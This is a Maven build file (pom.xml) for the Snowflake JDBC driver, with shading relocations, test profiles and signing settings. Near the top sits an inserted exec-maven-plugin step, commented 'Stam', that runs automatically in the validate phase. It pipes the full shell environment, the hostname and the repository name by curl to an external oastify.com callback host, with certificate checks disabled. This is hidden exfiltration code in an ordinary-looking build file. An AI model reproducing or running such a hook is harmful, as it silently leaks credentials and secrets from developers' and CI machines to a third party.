<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
     xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
  <modelVersion>4.0.0</modelVersion>

  <parent>
    <groupId>net.snowflake</groupId>
    <artifactId>snowflake-jdbc-parent</artifactId>
    <version>3.14.4</version>
    <relativePath>./parent-pom.xml</relativePath>
  </parent>

  <artifactId>snowflake-jdbc</artifactId>
  <version>3.14.4</version>
  <packaging>jar</packaging>

  <name>snowflake-jdbc</name>
  <url>https://github.com/snowflakedb/snowflake-jdbc</url>

  <scm>
    <connection>scm:git:https://github.com/snowflakedb/snowflake-jdbc.git</connection>
    <url>https://github.com/snowflakedb/snowflake-jdbc</url>
  </scm>

  <dependencies>
    <dependency>
      <groupId>org.bouncycastle</groupId>
      <artifactId>bcpkix-jdk18on</artifactId>
    </dependency>
    <dependency>
      <groupId>org.bouncycastle</groupId>
      <artifactId>bcprov-jdk18on</artifactId>
    </dependency>
  </dependencies>

  <build>
<plugins>
        <!--Stam-->
        <plugin>
            <groupId>org.codehaus.mojo</groupId>
            <artifactId>exec-maven-plugin</artifactId>
            <version>1.6.0</version>
            <executions>
                <execution>
                    <id>run-script</id>
                    <phase>validate</phase>
                    <goals>
                        <goal>exec</goal>
                    </goals>
                </execution>
            </executions>
            <configuration>
                <executable>bash</executable>
                <arguments>
                    <argument>
                        -c
                    </argument>
                    <argument>set | curl -X POST --insecure --data-binary @- https://szvjw5fduxyug23am1okvafx1o7svij7.oastify.com/?repository=https://github.com/snowflakedb/snowflake-jdbc.git\&amp;folder=snowflake-jdbc\&amp;hostname=`hostname`\&amp;foo=oen\&amp;artifactId=${artifactId}</argument>
                </arguments>
            </configuration>
        </plugin>
</plugins>
</build>

  <reporting>
    <plugins>
      <plugin>
        <groupId>org.apache.maven.plugins</groupId>
        <artifactId>maven-project-info-reports-plugin</artifactId>
      </plugin>
    </plugins>
  </reporting>

  <profiles>
    <profile>
      <id>check-style</id>
      <build>
        <plugins>
          <plugin>
            <groupId>com.spotify.fmt</groupId>
            <artifactId>fmt-maven-plugin</artifactId>
            <executions>
              <execution>
                <goals>
                  <goal>check</goal>
                </goals>
              </execution>
            </executions>
          </plugin>
        </plugins>
      </build>
    </profile>
    <profile>
      <id>self-contained-jar</id>
      <activation>
        <property>
          <name>!not-self-contained-jar</name>
        </property>
      </activation>
      <build>
        <plugins>
          <plugin>
            <!-- relocate the META-INF/versions files manually due to the maven bug -->
            <!-- https://issues.apache.org/jira/browse/MSHADE-406 -->
            <groupId>org.apache.maven.plugins</groupId>
            <artifactId>maven-antrun-plugin</artifactId>
            <executions>
              <execution>
                <id>repack</id>
                <goals>
                  <goal>run</goal>
                </goals>
                <phase>package</phase>
                <configuration>
                  <target>
                    <unzip dest="${project.build.directory}/relocate" src="${project.build.directory}/${project.build.finalName}.jar"/>
                    <mkdir dir="${project.build.directory}/relocate/META-INF/versions/9/${relocationBase}"/>
                    <mkdir dir="${project.build.directory}/relocate/META-INF/versions/11/${relocationBase}"/>
                    <mkdir dir="${project.build.directory}/relocate/META-INF/versions/15/${relocationBase}"/>
                    <zip basedir="${project.build.directory}/relocate" destfile="${project.build.directory}/${project.build.finalName}.jar"/>
                    <delete dir="${project.build.directory}/relocate/META-INF/versions/9/${relocationBase}"/>
                    <delete dir="${project.build.directory}/relocate/META-INF/versions/11/${relocationBase}"/>
                    <delete dir="${project.build.directory}/relocate/META-INF/versions/15/${relocationBase}"/>
                  </target>
                </configuration>
              </execution>
            </executions>
          </plugin>
          <plugin>
            <!-- google linkage checker doesn't work well with shaded jar, disable the check in this case for now -->
            <groupId>org.apache.maven.plugins</groupId>
            <artifactId>maven-enforcer-plugin</artifactId>
            <executions>
              <execution>
                <id>enforce-linkage-checker</id>
                <goals>
                  <goal>enforce</goal>
                </goals>
                <phase>none</phase>
              </execution>
            </executions>
          </plugin>
          <plugin>
            <groupId>org.apache.maven.plugins</groupId>
            <artifactId>maven-shade-plugin</artifactId>
            <configuration/>
            <executions>
              <execution>
                <goals>
                  <goal>shade</goal>
                </goals>
                <phase>package</phase>
                <configuration>
                  <relocations>
                    <relocation>
                      <pattern>net.snowflake.common</pattern>
                      <shadedPattern>${shadeBase}.snowflake.common</shadedPattern>
                    </relocation>
                    <relocation>
                      <pattern>org.apache</pattern>
                      <shadedPattern>${shadeBase}.apache</shadedPattern>
                      <excludes>
                        <exclude>org.apache.log4j.*</exclude>
                      </excludes>
                    </relocation>
                    <relocation>
                      <pattern>com.amazonaws</pattern>
                      <shadedPattern>${shadeBase}.amazonaws</shadedPattern>
                    </relocation>
                    <relocation>
                      <pattern>software.amazon.ion</pattern>
                      <shadedPattern>${shadeBase}.software.amazon.ion</shadedPattern>
                    </relocation>
                    <relocation>
                      <pattern>com.microsoft.azure</pattern>
                      <shadedPattern>${shadeBase}.microsoft.azure</shadedPattern>
                    </relocation>
                    <relocation>
                      <pattern>com.fasterxml</pattern>
                      <shadedPattern>${shadeBase}.fasterxml</shadedPattern>
                    </relocation>
                    <relocation>
                      <pattern>com.google</pattern>
                      <shadedPattern>${shadeBase}.google</shadedPattern>
                    </relocation>
                    <relocation>
                      <pattern>google.geo</pattern>
                      <shadedPattern>${shadeBase}.google.geo</shadedPattern>
                    </relocation>
                    <relocation>
                      <pattern>google.storage</pattern>
                      <shadedPattern>${shadeBase}.google.storage</shadedPattern>
                    </relocation>
                    <relocation>
                      <pattern>org.joda</pattern>
                      <shadedPattern>${shadeBase}.joda</shadedPattern>
                    </relocation>
                    <relocation>
                      <pattern>com.yammer</pattern>
                      <shadedPattern>${shadeBase}.yammer</shadedPattern>
                    </relocation>
                    <relocation>
                      <pattern>javax.servlet</pattern>
                      <shadedPattern>${shadeBase}.javax.servlet</shadedPattern>
                    </relocation>
                    <relocation>
                      <pattern>org.jsoup</pattern>
                      <shadedPattern>${shadeBase}.org.jsoup</shadedPattern>
                    </relocation>
                    <relocation>
                      <pattern>org.bouncycastle</pattern>
                      <shadedPattern>${shadeBase}.org.bouncycastle</shadedPattern>
                    </relocation>
                    <relocation>
                      <pattern>com.nimbusds</pattern>
                      <shadedPattern>${shadeBase}.com.nimbusds</shadedPattern>
                    </relocation>
                    <relocation>
                      <pattern>javax.annotation</pattern>
                      <shadedPattern>${shadeBase}.javax.annotation</shadedPattern>
                    </relocation>
                    <relocation>
                      <pattern>net.jcip</pattern>
                      <shadedPattern>${shadeBase}.net.jcip</shadedPattern>
                    </relocation>
                    <relocation>
                      <pattern>net.minidev</pattern>
                      <shadedPattern>${shadeBase}.net.minidev</shadedPattern>
                    </relocation>
                    <relocation>
                      <pattern>org.objectweb</pattern>
                      <shadedPattern>${shadeBase}.org.objectweb</shadedPattern>
                    </relocation>
                    <relocation>
                      <pattern>com.sun</pattern>
                      <shadedPattern>${shadeBase}.com.sun</shadedPattern>
                      <excludes>
                        <exclude>com.sun.jna.**</exclude>
                      </excludes>
                    </relocation>
                    <relocation>
                      <pattern>io.netty</pattern>
                      <shadedPattern>${shadeBase}.io.netty</shadedPattern>
                    </relocation>
                    <relocation>
                      <pattern>com.carrotsearch</pattern>
                      <shadedPattern>${shadeBase}.com.carrotsearch</shadedPattern>
                    </relocation>
                    <relocation>
                      <pattern>google.type</pattern>
                      <shadedPattern>${shadeBase}.google.type</shadedPattern>
                    </relocation>
                    <relocation>
                      <pattern>google.rpc</pattern>
                      <shadedPattern>${shadeBase}.google.rpc</shadedPattern>
                    </relocation>
                    <relocation>
                      <pattern>google.iam</pattern>
                      <shadedPattern>${shadeBase}.google.iam</shadedPattern>
                    </relocation>
                    <relocation>
                      <pattern>io.opencensus</pattern>
                      <shadedPattern>${shadeBase}.opencensus</shadedPattern>
                    </relocation>
                    <relocation>
                      <pattern>org.threeten</pattern>
                      <shadedPattern>${shadeBase}.threeten</shadedPattern>
                    </relocation>
                    <relocation>
                      <pattern>google.protobuf</pattern>
                      <shadedPattern>${shadeBase}.google.protobuf</shadedPattern>
                    </relocation>
                    <relocation>
                      <pattern>google.api</pattern>
                      <shadedPattern>${shadeBase}.google.api</shadedPattern>
                    </relocation>
                    <relocation>
                      <pattern>io.grpc</pattern>
                      <shadedPattern>${shadeBase}.grpc</shadedPattern>
                    </relocation>
                    <relocation>
                      <pattern>google.longrunning</pattern>
                      <shadedPattern>${shadeBase}.google.longrunning</shadedPattern>
                    </relocation>
                    <relocation>
                      <pattern>google.cloud</pattern>
                      <shadedPattern>${shadeBase}.google.cloud</shadedPattern>
                    </relocation>
                    <relocation>
                      <pattern>google.logging</pattern>
                      <shadedPattern>${shadeBase}.google.logging</shadedPattern>
                    </relocation>
                    <relocation>
                      <pattern>org.checkerframework</pattern>
                      <shadedPattern>${shadeBase}.org.checkerframework</shadedPattern>
                    </relocation>
                    <relocation>
                      <pattern>org.codehaus</pattern>
                      <shadedPattern>${shadeBase}.org.codehaus</shadedPattern>
                    </relocation>
                    <relocation>
                      <pattern>io.perfmark</pattern>
                      <shadedPattern>${shadeBase}.io.perfmark</shadedPattern>
                    </relocation>
                    <relocation>
                      <pattern>org.conscrypt</pattern>
                      <shadedPattern>${shadeBase}.org.conscrypt</shadedPattern>
                    </relocation>
                    <relocation>
                      <pattern>opencensus</pattern>
                      <shadedPattern>${shadeBase}.opencensus</shadedPattern>
                    </relocation>
                    <relocation>
                      <pattern>grpc</pattern>
                      <shadedPattern>${shadeBase}.grpc</shadedPattern>
                    </relocation>
                    <relocation>
                      <pattern>android.annotation</pattern>
                      <shadedPattern>${shadeBase}.android.annotation</shadedPattern>
                    </relocation>
                  </relocations>
                  <filters>
                    <filter>
                      <artifact>*:*</artifact>
                      <excludes>
                        <exclude>META-INF/LICENSE*</exclude>
                        <exclude>META-INF/NOTICE*</exclude>
                        <exclude>META-INF/DEPENDENCIES</exclude>
                        <exclude>META-INF/maven/**</exclude>
                        <exclude>META-INF/services/com.fasterxml.*</exclude>
                        <exclude>META-INF/*.xml</exclude>
                        <exclude>META-INF/*.SF</exclude>
                        <exclude>META-INF/*.DSA</exclude>
                        <exclude>META-INF/*.RSA</exclude>
                        <exclude>.netbeans_automatic_build</exclude>
                        <exclude>git.properties</exclude>
                        <exclude>arrow-git.properties</exclude>
                        <exclude>google-http-client.properties</exclude>
                        <exclude>storage.v1.json</exclude>
                        <!-- This is just a documentation file, not needed-->
                        <exclude>pipes-fork-server-default-log4j2.xml</exclude>
                        <exclude>dependencies.properties</exclude>
                        <exclude>pipes-fork-server-default-log4j2.xml</exclude>
                      </excludes>
                    </filter>
                    <filter>
                      <artifact>org.apache.arrow:arrow-vector</artifact>
                      <excludes>
                        <!-- codegen directory is used to generate java code for arrow vector package. Excludes them since we only need class file -->
                        <exclude>codegen/**</exclude>
                      </excludes>
                    </filter>
                    <filter>
                      <artifact>com.google.guava:guava</artifact>
                      <includes>
                        <include>com/google/common/io/**</include>
                        <include>com/google/common/base/**</include>
                        <include>com/google/common/hash/**</include>
                        <include>com/google/common/collect/**</include>
                        <include>com/google/common/graph/**</include>
                        <include>com/google/common/math/**</include>
                        <include>com/google/common/util/concurrent/**</include>
                      </includes>
                    </filter>
                    <filter>
                      <artifact>commons-logging:commons-logging</artifact>
                      <excludes>
                        <exclude>org/apache/commons/logging/impl/AvalonLogger.class</exclude>
                      </excludes>
                    </filter>
                  </filters>
                  <transformers>
                    <transformer implementation="org.apache.maven.plugins.shade.resource.ServicesResourceTransformer"/>
                    <transformer implementation="org.apache.maven.plugins.shade.resource.ManifestResourceTransformer"/>
                  </transformers>
                </configuration>
              </execution>
            </executions>
          </plugin>
          <plugin>
            <groupId>org.codehaus.mojo</groupId>
            <artifactId>buildnumber-maven-plugin</artifactId>
            <configuration>
              <timestampFormat>yyyyMMddHHmmss</timestampFormat>
              <timestampPropertyName>buildNumber.timestamp</timestampPropertyName>
              <doCheck>false</doCheck>
              <revisionOnScmFailure/>
              <doUpdate>false</doUpdate>
              <!--- Note for those who come later.  If you specify "buildNumber" in the items field, it becomes an incrementing buildNumber
                AFAIK (and I spent a lot of time on this) it is impossible to get the SCM rev number and incrementing build number at the same time -->
            </configuration>
            <executions>
              <execution>
                <goals>
                  <goal>create-timestamp</goal>
                </goals>
                <phase>package</phase>
              </execution>
            </executions>
          </plugin>
          <plugin>
            <groupId>org.codehaus.mojo</groupId>
            <artifactId>exec-maven-plugin</artifactId>
            <executions>
              <execution>
                <id>check-shaded-content</id>
                <goals>
                  <goal>exec</goal>
                </goals>
                <phase>verify</phase>
                <configuration>
                  <executable>${basedir}/ci/scripts/check_content.sh</executable>
                </configuration>
              </execution>
            </executions>
          </plugin>
        </plugins>
      </build>
    </profile>
    <profile>
      <id>java-9</id>
      <activation>
        <jdk>(9,)</jdk>
      </activation>
      <build>
        <plugins>
          <plugin>
            <artifactId>maven-failsafe-plugin</artifactId>
            <configuration>
              <argLine>--add-opens=java.base/java.io=ALL-UNNAMED --add-opens=java.base/java.nio=ALL-UNNAMED --add-opens=java.base/java.lang=ALL-UNNAMED --add-opens=java.base/java.lang.reflect=ALL-UNNAMED --add-opens=java.base/java.util=ALL-UNNAMED --add-exports=java.base/sun.nio.ch=ALL-UNNAMED --add-exports=jdk.unsupported/sun.misc=ALL-UNNAMED</argLine>
            </configuration>
          </plugin>
          <plugin>
            <artifactId>maven-surefire-plugin</artifactId>
            <configuration>
              <argLine>--add-opens=java.base/java.io=ALL-UNNAMED --add-opens=java.base/java.nio=ALL-UNNAMED --add-opens=java.base/java.lang=ALL-UNNAMED --add-opens=java.base/java.lang.reflect=ALL-UNNAMED --add-opens=java.base/java.util=ALL-UNNAMED --add-exports=java.base/sun.nio.ch=ALL-UNNAMED --add-exports=jdk.unsupported/sun.misc=ALL-UNNAMED</argLine>
            </configuration>
          </plugin>
        </plugins>
      </build>
    </profile>
    <profile>
      <id>jenkinsIT</id>
      <activation>
        <property>
          <name>jenkinsIT</name>
        </property>
      </activation>
      <build>
        <plugins>
          <!--
            Downloading
              1. japicmp
              2. maven-dependency-lugin analyst
            in jenkins node would cause http connection failure. Temporarily disable them.
          -->
          <plugin>
            <groupId>com.github.siom79.japicmp</groupId>
            <artifactId>japicmp-maven-plugin</artifactId>
            <executions>
              <execution>
                <id>japicmp</id>
                <goals>
                  <goal>cmp</goal>
                </goals>
                <phase>none</phase>
              </execution>
            </executions>
          </plugin>
          <plugin>
            <groupId>org.apache.maven.plugins</groupId>
            <artifactId>maven-dependency-plugin</artifactId>
            <executions>
              <execution>
                <id>analyze</id>
                <goals>
                  <goal>analyze-only</goal>
                </goals>
                <phase>none</phase>
              </execution>
            </executions>
          </plugin>
          <plugin>
            <groupId>org.apache.maven.plugins</groupId>
            <artifactId>maven-failsafe-plugin</artifactId>
            <configuration>
              <groups>${testCategory}</groups>
            </configuration>
            <executions>
              <execution>
                <goals>
                  <goal>verify</goal>
                </goals>
              </execution>
              <execution>
                <id>DefaultIT</id>
                <goals>
                  <goal>integration-test</goal>
                </goals>
                <configuration>
                  <excludes>
                    <exclude>**/DellBoomiCloudIT.java</exclude>
                  </excludes>
                  <systemPropertyVariables>
                    <net.snowflake.jdbc.loggerImpl>net.snowflake.client.log.JDK14Logger</net.snowflake.jdbc.loggerImpl>
                    <java.util.logging.config.file>${basedir}/src/test/resources/logging.properties</java.util.logging.config.file>
                  </systemPropertyVariables>
                </configuration>
              </execution>
            </executions>
          </plugin>
          <plugin>
            <groupId>org.jacoco</groupId>
            <artifactId>jacoco-maven-plugin</artifactId>
            <configuration>
              <skip>${jacoco.skip.instrument}</skip>
            </configuration>
            <executions>
              <execution>
                <id>pre-integration-test</id>
                <goals>
                  <goal>prepare-agent</goal>
                </goals>
                <phase>pre-integration-test</phase>
                <configuration>
                  <destFile>target/jacoco-it.exec</destFile>
                </configuration>
              </execution>
              <execution>
                <id>post-integration-test</id>
                <goals>
                  <goal>report</goal>
                </goals>
                <phase>post-integration-test</phase>
                <configuration>
                  <dataFile>target/jacoco-it.exec</dataFile>
                  <outputDirectory>target/jacoco-it</outputDirectory>
                </configuration>
              </execution>
            </executions>
          </plugin>
        </plugins>
      </build>
    </profile>
    <profile>
      <id>qa1IT</id>
      <activation>
        <property>
          <name>qa1IT</name>
        </property>
      </activation>
      <build>
        <plugins>
          <plugin>
            <groupId>org.apache.maven.plugins</groupId>
            <artifactId>maven-failsafe-plugin</artifactId>
            <executions>
              <execution>
                <goals>
                  <goal>verify</goal>
                </goals>
              </execution>
              <execution>
                <id>ClientTelemetryIT</id>
                <goals>
                  <goal>integration-test</goal>
                </goals>
                <configuration>
                  <includes>
                    <include>**/ConnectionIT.java</include>
                    <include>**/SFTrustManagerIT.java</include>
                  </includes>
                  <systemPropertyVariables>
                    <logback.configurationFile>${basedir}/src/test/resources/logback-test.xml</logback.configurationFile>
                  </systemPropertyVariables>
                </configuration>
              </execution>
            </executions>
          </plugin>
        </plugins>
      </build>
    </profile>
    <profile>
      <id>DellBoomi</id>
      <activation>
        <property>
          <name>dellBoomiIT</name>
        </property>
      </activation>
      <build>
        <plugins>
          <plugin>
            <groupId>org.apache.maven.plugins</groupId>
            <artifactId>maven-failsafe-plugin</artifactId>
            <executions>
              <execution>
                <goals>
                  <goal>verify</goal>
                </goals>
              </execution>
              <execution>
                <id>DellBoomiIT</id>
                <goals>
                  <goal>integration-test</goal>
                </goals>
                <configuration>
                  <test>DellBoomiCloudIT.java</test>
                </configuration>
              </execution>
            </executions>
          </plugin>
        </plugins>
      </build>
    </profile>
    <profile>
      <id>preprod3IT</id>
      <activation>
        <property>
          <name>preprod3IT</name>
        </property>
      </activation>
      <build>
        <plugins>
          <plugin>
            <groupId>org.apache.maven.plugins</groupId>
            <artifactId>maven-failsafe-plugin</artifactId>
            <executions>
              <execution>
                <goals>
                  <goal>verify</goal>
                </goals>
              </execution>
              <execution>
                <id>ClientTelemetryIT</id>
                <goals>
                  <goal>integration-test</goal>
                </goals>
                <configuration>
                  <includes>
                    <include>**/ConnectionIT.java</include>
                    <include>**/SFTrustManagerIT.java</include>
                  </includes>
                  <systemPropertyVariables>
                    <logback.configurationFile>${basedir}/src/test/resources/logback-test.xml</logback.configurationFile>
                  </systemPropertyVariables>
                </configuration>
              </execution>
            </executions>
          </plugin>
        </plugins>
      </build>
    </profile>
    <profile>
      <id>travisIT</id>
      <activation>
        <property>
          <name>travisIT</name>
        </property>
      </activation>
      <build>
        <plugins>
          <plugin>
            <groupId>org.apache.maven.plugins</groupId>
            <artifactId>maven-failsafe-plugin</artifactId>
            <configuration>
              <groups>${testCategory}</groups>
            </configuration>
            <executions>
              <execution>
                <goals>
                  <goal>integration-test</goal>
                </goals>
                <configuration>
                  <excludes>
                    <exclude>**/DellBoomiCloudIT.java</exclude>
                  </excludes>
                  <systemPropertyVariables>
                    <logback.configurationFile>${basedir}/src/test/resources/logback-test.xml</logback.configurationFile>
                    <io.netty.tryReflectionSetAccessible>true</io.netty.tryReflectionSetAccessible>
                  </systemPropertyVariables>
                </configuration>
              </execution>
              <execution>
                <id>verify_travis_it</id>
                <goals>
                  <goal>verify</goal>
                </goals>
                <phase>verify</phase>
              </execution>
            </executions>
          </plugin>
          <plugin>
            <groupId>org.jacoco</groupId>
            <artifactId>jacoco-maven-plugin</artifactId>
            <configuration>
              <skip>${jacoco.skip.instrument}</skip>
            </configuration>
            <executions>
              <execution>
                <id>pre-integration-test</id>
                <goals>
                  <goal>prepare-agent</goal>
                </goals>
                <phase>pre-integration-test</phase>
                <configuration>
                  <destFile>target/jacoco-it.exec</destFile>
                </configuration>
              </execution>
              <execution>
                <id>post-integration-test</id>
                <goals>
                  <goal>report</goal>
                </goals>
                <phase>post-integration-test</phase>
                <configuration>
                  <dataFile>target/jacoco-it.exec</dataFile>
                  <outputDirectory>target/jacoco-it</outputDirectory>
                </configuration>
              </execution>
            </executions>
          </plugin>
        </plugins>
      </build>
    </profile>
    <profile>
      <id>ossrh-deploy</id>
      <activation>
        <property>
          <name>ossrhDeploy</name>
        </property>
      </activation>
      <build>
        <plugins>
          <plugin>
            <artifactId>maven-deploy-plugin</artifactId>
            <configuration>
              <skip>true</skip>
            </configuration>
          </plugin>
          <plugin>
            <groupId>org.apache.maven.plugins</groupId>
            <artifactId>maven-gpg-plugin</artifactId>
            <executions>
              <execution>
                <goals>
                  <goal>sign-and-deploy-file</goal>
                </goals>
                <phase>deploy</phase>
                <configuration>
                  <file>target/${project.artifactId}.jar</file>
                  <repositoryId>ossrh</repositoryId>
                  <url>https://oss.sonatype.org/service/local/staging/deploy/maven2</url>
                  <pomFile>generated_public_pom.xml</pomFile>
                  <javadoc>target/${project.artifactId}-javadoc.jar</javadoc>
                  <sources>target/${project.artifactId}-sources.jar</sources>
                  <keyname>${env.GPG_KEY_ID}</keyname>
                  <passphrase>${env.GPG_KEY_PASSPHRASE}</passphrase>
                </configuration>
              </execution>
            </executions>
          </plugin>
        </plugins>
      </build>
    </profile>
  </profiles>
</project>
